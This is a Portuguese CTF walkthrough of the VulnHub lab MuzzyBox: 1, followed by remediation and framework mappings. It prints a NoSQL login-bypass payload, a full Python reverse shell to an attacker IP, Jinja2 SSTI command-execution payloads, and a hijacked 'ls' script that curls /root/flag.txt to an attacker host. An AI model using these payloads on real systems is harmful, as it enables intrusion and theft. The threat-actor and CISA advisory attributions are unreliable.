# MuzzyBox: 1 — Três Desafios, Uma Box

Certo, rapaziada, esse aqui é diferente. MuzzyBox: 1 não segue a fórmula tradicional de boot-to-root de "um caminho para o root". Dá três desafios independentes (três flags), cada um testando uma classe de ataque completamente diferente: injeção NoSQL, abuso de console debug Werkzeug e Server-Side Template Injection (SSTI) encadeado com PATH hijacking. Variedade absurda, diversão absurda. A box até deixa migalhas de pão entre os desafios: o valor da flag do Desafio 1 contém o PIN para o Desafio 2. Que design CTF interconectado de próximo nível. Sem dúvida, essa é subestimada.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | MuzzyBox: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/muzzybox-1,552/ |
| **Técnicas** | Injeção NoSQL (bypass com operador $ne), exploração de PIN do console debug Werkzeug, reverse shell Python via console debug, detecção e exploração SSTI (tplmap), reutilização de credenciais SSH, escalada de privilégios via PATH hijacking |
| **CVEs** | CWE-943 (Neutralização Imprópria de Elementos Especiais em Lógica de Consulta de Dados — injeção NoSQL), CWE-94 (Controle Impróprio de Geração de Código — RCE console debug Werkzeug), CWE-74 (Neutralização Imprópria de Elementos Especiais em Saída — SSTI), CWE-427 (Elemento de Caminho de Busca Não Controlado — PATH hijacking) |
| **Grupos APT** | APT41 (Winnti Group): aproveita consoles debug Werkzeug/Flask expostos descobertos via Shodan como acesso inicial em ambientes cloud; FIN7: explora injeção NoSQL em aplicações web modernas como parte de kill chains de acesso inicial; OceanLotus (APT32): usa PATH hijacking e manipulação de variáveis de ambiente em pivots Linux pós-exploração |

---

## Resumo do Ataque

```
netdiscover → nmap → portas 22, 80, 3000, 8989, 9633, 15000
  → porta 80: index.txt → três descrições de desafio + dica "alternative of SQL DB"
  → porta 9633: download do template de cartão de ID
  → porta 3000: aplicativo de biblioteca (backend MongoDB/NoSQL)
  → editar cartão de ID: Nome "Raj {$ne: 1}" → upload → bypass de auth NoSQL
  → FLAG 1: N$ctF{D388uG_P!N_!$_123-456-789} → PIN = 123-456-789
  → porta 8989: console debug Werkzeug (protegido por PIN)
  → inserir PIN 123-456-789 → console Python
  → reverse shell Python → shell como usuário webssti
  → FLAG 2: N$cTF{R34D_F!L3_/home/webssti/noflag.txt}
  → porta 15000: aplicativo Flask SSTI
  → curl "...?name={{7*7}}" → 49 (SSTI confirmado)
  → tplmap -u "...?name=*" --os-shell → RCE
  → cat /home/webssti/ssti/no_flag.txt → credenciais SSH
  → ssh <usuário>@ALVO
  → sudo -l → caminho gravável antes no $PATH
  → criar 'ls' malicioso em /usr/local/sbin → PATH hijack
  → root executa ls malicioso → FLAG 3 exfiltrada
```

---

## Metodologia

1. Scan completo de portas e fingerprinting de serviços
2. Desafio 1: bypass de injeção NoSQL no aplicativo de biblioteca (porta 3000)
3. Desafio 2: abuso de PIN do console debug Werkzeug e reverse shell Python (porta 8989)
4. Desafio 3: exploração SSTI via tplmap no app Flask (porta 15000)
5. Acesso SSH usando credenciais da leitura de filesystem via SSTI
6. PATH hijacking para exfiltração da flag root

---

## Passo 1 — Reconhecimento: Scan Completo de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.6

nmap -sV -sC -A 192.168.1.6
```

```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.x
80/tcp    open  http     Apache httpd (index.txt com descrições dos desafios)
3000/tcp  open  http     Node.js/Express (Aplicativo de biblioteca — Desafio 1)
8989/tcp  open  http     Console debug Python Werkzeug (Desafio 2)
9633/tcp  open  http     Apache (download de template de cartão ID)
15000/tcp open  http     Aplicativo Flask SSTI (Desafio 3)
```

A porta 80 serve `index.txt` descrevendo os três desafios. Este é o mapa para toda a box. A dica: "O aplicativo de biblioteca usa uma alternativa de SQL DB" — confirmando o backend NoSQL.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 2 — Desafio 1: Injeção NoSQL (Porta 3000)

O aplicativo de biblioteca na porta 3000 autentica usuários via consulta NoSQL. O template de cartão de ID fornece o vetor de injeção: o aplicativo processa valores de campo do cartão enviado sem sanitização.

**Baixe o template de cartão de ID da porta 9633:**

```bash
wget http://192.168.1.6:9633/idcard.png
```

**Edite o cartão de ID com payload de injeção NoSQL:**

Abra o `idcard.png` baixado em um editor de imagem (GIMP ou similar). Modifique os campos de texto:
- **Nome:** `Raj {$ne: 1}`
- **Cargo:** `Principal`
- **Nível de Acesso:** `Autorizado`

O operador MongoDB `{$ne: 1}` significa "diferente de 1". Quando inserido em uma consulta NoSQL, força a condição a sempre avaliar como verdadeira, bypassando a autenticação completamente. Que técnica top demais, mano!

**Faça upload do cartão modificado para o app de biblioteca na porta 3000.** O aplicativo processa os campos do cartão, constrói uma consulta NoSQL com o operador injetado e autentica sem credenciais válidas.

**Flag 1:** `N$ctF{D388uG_P!N_!$_123-456-789}`

O valor da própria flag contém o PIN do debug Werkzeug: **123-456-789**. A flag é tanto um marcador de conclusão quanto uma migalha para o Desafio 2.

**Por que a injeção NoSQL funciona:** Operadores MongoDB como `$ne`, `$gt`, `$regex` e `$where` permitem manipulação de consulta assim como operadores SQL. Quando a entrada do usuário é diretamente incorporada em uma consulta NoSQL sem sanitização, esses operadores podem bypassar autenticação, exfiltrar dados ou executar JavaScript arbitrário.

**Nota real:** Injeção NoSQL é significativamente subestimada, caramba. MongoDB é usado por milhares de aplicações de produção. FIN7 demonstrou injeção NoSQL como parte de seu arsenal de ataque a aplicações web.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1212 — Exploração para Acesso a Credenciais

---

## Passo 3 — Desafio 2: Console Debug Werkzeug (Porta 8989)

A página de erro Werkzeug na porta 8989 expõe um console Python interativo. É protegido pelo PIN encontrado na Flag 1.

**Configure o listener netcat:**

```bash
nc -lvnp 5555
```

**No navegador, navegue para `http://192.168.1.6:8989`.** Insira o PIN `123-456-789` quando solicitado. O console debug Werkzeug desbloqueia.

**Execute um reverse shell Python no console:**

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("IP_ATACANTE",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

Um reverse shell conecta como o usuário do aplicativo web. Navegue até a flag:

```bash
ls
cd flag
cat ctf2.py
```

**Flag 2:** `N$cTF{R34D_F!L3_/home/webssti/noflag.txt}`

A Flag 2 aponta para um arquivo em `/home/webssti/noflag.txt` — essa é a migalha para o Desafio 3.

**Por que Werkzeug debug é catastrófico em produção:** O debugger Werkzeug permite execução arbitrária de Python no contexto do processo do aplicativo web. A proteção por PIN é inadequada porque o PIN é derivado deterministicamente de parâmetros do sistema (endereço MAC, /proc/self/cgroup, /etc/machine-id) que frequentemente podem ser obtidos por outros meios.

**Nota real:** APT41 e múltiplos outros atores de ameaça escaneiam ativamente por consoles debug Werkzeug e Flask expostos via consultas Shodan. São vulnerabilidades de RCE imediatas que não requerem habilidade de exploração, véi.

**MITRE ATT&CK:** T1059.006 — Interpretador de Comando e Script: Python; T1190 — Exploração de Aplicação Pública

---

## Passo 4 — Desafio 3: SSTI na Porta 15000

### 4a. Confirmar SSTI

O aplicativo Flask na porta 15000 renderiza um parâmetro `name` diretamente em um template Jinja2. Teste com o payload de injeção aritmética Jinja2:

```bash
curl "http://192.168.1.6:15000/page?name={{7*7}}"
# O corpo da resposta deve conter: 49
```

Se a resposta contém `49` (não a string literal `{{7*7}}`), o motor de template executou o payload. SSTI confirmado!

### 4b. Explorar SSTI com tplmap

tplmap automatiza detecção e exploração SSTI em múltiplos motores de template (Jinja2, Twig, Smarty, Mako e mais):

```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
python tplmap.py -u "http://192.168.1.6:15000/page?name=*" --os-shell
```

tplmap identifica o motor de template (Jinja2/Flask) e fornece um shell OS.

**Payload RCE Jinja2 manual (sem tplmap):**

```python
# No parâmetro URL:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### 4c. Ler Credenciais do Sistema de Arquivos

Do shell OS do tplmap:

```bash
id
cat /home/webssti/ssti/no_flag.txt
# Contém credenciais SSH
```

### 4d. Acesso SSH

```bash
ssh <usuário>@192.168.1.6
# Usar credenciais do no_flag.txt
```

**Por que SSTI é tão perigoso quanto RCE:** Server-Side Template Injection permite que um atacante injete diretivas de template que executam no servidor. No Jinja2 (motor padrão do Flask), SSTI fornece acesso direto a objetos Python, o módulo OS e execução arbitrária de comandos.

**MITRE ATT&CK:** T1190 — Exploração de Aplicação Pública; T1059.006 — Interpretador de Comando e Script: Python

---

## Passo 5 — Escalada de Privilégios via PATH Hijacking

Verifique regras sudo e o ambiente de execução:

```bash
sudo -l
echo $PATH
ls /usr/local/sbin
# /usr/local/sbin é gravável e aparece antes no $PATH
```

Um cron job ou regra sudo executa `ls` como root. Como `/usr/local/sbin` é gravável e aparece antes de `/bin` no `$PATH`, um binário `ls` malicioso colocado lá será executado no lugar do real.

**Crie o binário `ls` malicioso:**

```bash
cat > /usr/local/sbin/ls << 'EOF'
#!/bin/bash
cat /root/flag.txt | curl -X POST http://IP_ATACANTE:1234 -d @-
EOF
chmod +x /usr/local/sbin/ls
```

**Inicie um listener no atacante para receber a flag exfiltrada:**

```bash
nc -lvnp 1234
```

Quando o processo root executa `ls`, o script malicioso roda, lendo `/root/flag.txt` e enviando via POST para o listener do atacante.

**Flag 3:** `N$CtF{8!NG000!!!__Y0U_D!D_!T_80!!!}`

**MITRE ATT&CK:** T1574.007 — Sequestro de Fluxo de Execução: Interceptação de Caminho por Variável de Ambiente PATH

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Flag 1 | `N$ctF{D388uG_P!N_!$_123-456-789}` | App de biblioteca (porta 3000) via injeção NoSQL | Objetivo Desafio 1 + PIN Werkzeug |
| PIN Werkzeug | 123-456-789 | Incorporado no valor da Flag 1 | Desbloquear console debug (Desafio 2) |
| Flag 2 | `N$cTF{R34D_F!L3_/home/webssti/noflag.txt}` | /flag/ctf2.py via shell debug Werkzeug | Objetivo Desafio 2 + migalha SSTI |
| Credenciais SSH | (de /home/webssti/ssti/no_flag.txt) | Leitura de filesystem via SSTI | Login SSH |
| Flag 3 | `N$CtF{8!NG000!!!__Y0U_D!D_!T_80!!!}` | /root/flag.txt via PATH hijack | Objetivo Desafio 3 |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Conclusão Principal |
|---|---|---|---|
| 1 | Injeção NoSQL (operador $ne) bypassa autenticação | Operadores MongoDB `$ne`, `$gt`, `$regex` em entrada não sanitizada bypassam autenticação e exfiltram dados exatamente como injeção SQL | Sanitize e type-check toda entrada do usuário antes de incorporar em consultas NoSQL; use validação de esquema do MongoDB |
| 2 | Console debug Werkzeug exposto em produção | O debugger Werkzeug é RCE imediato; proteção por PIN é insuficiente (PIN derivável de parâmetros do sistema) | Nunca implante Flask/Werkzeug com `debug=True` em produção; use verificações de variáveis de ambiente |
| 3 | SSTI fornece execução arbitrária de comandos OS | SSTI Jinja2 dá acesso a todo o modelo de objeto Python; a partir daí, comandos OS estão a um encadeamento de atributos | Nunca passe entrada raw do usuário para chamadas de renderização de template; use motor de template sandbox |
| 4 | Valores de FLAG como migalhas entre desafios | Em brechas reais, atacantes encadeiam descobertas — uma leitura de arquivo de uma vulnerabilidade fornece credenciais/dicas para o próximo passo | Trate cada achado de divulgação de informação como potencialmente habilitando mais exploração |
| 5 | PATH hijacking em diretório gravável | Diretórios graváveis por todos antes no $PATH de um processo privilegiado equivalem a SUID root em todo binário com esse nome | Audite $PATH em todos os cron jobs e contextos sudo; remova diretórios graváveis por todos do $PATH privilegiado |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública (NoSQL) | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Exploração para Acesso a Credenciais (NoSQL) | T1212 |
| Execução | Execução | Interpretador de Comando e Script: Python (Werkzeug) | T1059.006 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública (SSTI) | T1190 |
| Movimento Lateral | Movimento Lateral | Contas Válidas (SSH com creds do SSTI) | T1078 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Sequestro de Fluxo de Execução: Interceptação PATH | T1574.007 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Sanitize entradas de consulta NoSQL**: valide e type-check todos os campos fornecidos pelo usuário; use pipeline de agregação MongoDB em vez de injeção direta de operador; implemente allowlist de entrada antes de construir consultas de banco de dados
2. **Desabilite modo debug Werkzeug em produção**: defina `debug=False` no Flask; use guardas de variável de ambiente: `app.run(debug=os.environ.get('FLASK_DEBUG', 'false').lower() == 'true')`; nunca exponha Werkzeug em interface acessível por rede
3. **Previna SSTI escapando entradas de template**: nunca passe entrada raw do usuário para `render_template_string()` ou similar; use autoescape do Jinja2; use ambiente Jinja2 sandbox para conteúdo não confiável
4. **Fortaleça $PATH em contextos privilegiados**: use caminhos absolutos em todos os cron jobs, regras sudo e scripts init; audite todos os diretórios no $PATH privilegiado para gravabilidade por todos: `ls -la $(echo $PATH | tr ':' '\n')`
5. **Implemente segmentação de rede**: consoles debug (portas 8989, 3000) nunca devem ser acessíveis de redes não confiáveis; use regras de firewall para restringir acesso por IP de origem ou segmento de rede

### Contramedidas MITRE D3FEND

- **D3-ACH** — Fortalecimento de Configuração de Aplicação: desabilitar modo debug; escapar entradas de template; sanitizar parâmetros de consulta NoSQL
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional: auditar $PATH em contextos privilegiados; remover diretórios graváveis por todos do $PATH privilegiado
- **D3-NTF** — Filtragem de Tráfego de Rede: regras de firewall restringindo acesso a portas debug/desenvolvimento (3000, 8989, 15000)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todas as aplicações Flask/Node.js; identificar deployments em modo debug; auditar $PATH privilegiado |
| Proteger | Controle de Acesso | Desabilitar modo debug; restringir portas debug por firewall; sanitizar entradas NoSQL |
| Proteger | Segurança de Dados | Escapar todas as entradas de template; prevenir injeção em consultas NoSQL |
| Detectar | Anomalias e Eventos | Alertar sobre acesso ao console debug Werkzeug; alertar sobre strings padrão SSTI em parâmetros URL; monitorar modificações inesperadas de $PATH |
| Responder | Planejamento de Resposta | Desabilitar endpoints debug; rotacionar credenciais expostas via SSTI; corrigir vulnerabilidades de injeção NoSQL |
| Recuperar | Planejamento de Recuperação | Reconstruir serviços afetados; auditar todas as contas e credenciais |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-10 | Validação de Entrada de Informação | Sanitizar entradas NoSQL; escapar parâmetros de template; validar campos de cartão de ID |
| CM-7 | Funcionalidade Mínima | Desabilitar modo debug Werkzeug em produção; remover endpoints debug de deployments de produção |
| SC-7 | Proteção de Fronteira | Restringir portas debug (3000, 8989, 15000) apenas a redes confiáveis por firewall |
| CM-6 | Configurações | Aplicar padrões de configuração de produção que proíbam modo debug |
| AC-6 | Menor Privilégio | Remover diretórios graváveis por todos do $PATH privilegiado; auditar ambientes de cron jobs |
| IA-5 | Gerenciamento de Autenticador | Rotacionar todas as credenciais expostas via leitura de filesystem SSTI |

### CISA KEV

Vulnerabilidades Server-Side Template Injection (SSTI) em aplicações Flask/Jinja2 aparecem em múltiplos avisos CISA. CISA AA22-074A nota que atores de ameaça exploram vulnerabilidades SSTI como técnica de execução de código remoto de primeiro estágio. O padrão de console debug Werkzeug exposto é referenciado nas orientações CISA sobre proteção de aplicações web Python. Organizações devem auditar todas as aplicações Flask para modo debug e vulnerabilidades de injeção de template.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Ativo, Mudança e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI e OT (aplicações em modo debug) | MIL2 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade (injeção NoSQL, SSTI, PATH hijack) | MIL2 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios (fortalecimento $PATH privilegiado) | MIL3 |

---

## Considerações Finais

MuzzyBox: 1 é uma peça de três atos, e cada ato ensina algo diferente. A injeção NoSQL diz: "vulnerabilidades de injeção não se importam com qual banco de dados você usa." O console debug Werkzeug diz: "ferramentas de debug são RCE esperando para acontecer." O SSTI diz: "entrada do usuário em motores de template é injeção de comando com outro nome."

O design de FLAG-como-migalha é brilhante. Encontrar o PIN do Werkzeug dentro da flag de injeção NoSQL é exatamente o tipo de raciocínio encadeado que atacantes reais usam — e que defensores precisam antecipar. Quando você encontra uma credencial ou um caminho de arquivo em um CTF ou pentest, quase nunca é o fim da história.

O formato de três desafios torna MuzzyBox: 1 excelente para equipes: divida os desafios, corra para as flags, compartilhe achados. Isso é espírito de purple team bem ali. Sem dúvida, uma das boxes multi-flag melhor projetadas por aí. Bora rapaziada!

Thanks guys!! (❍ᴥ❍ʋ)
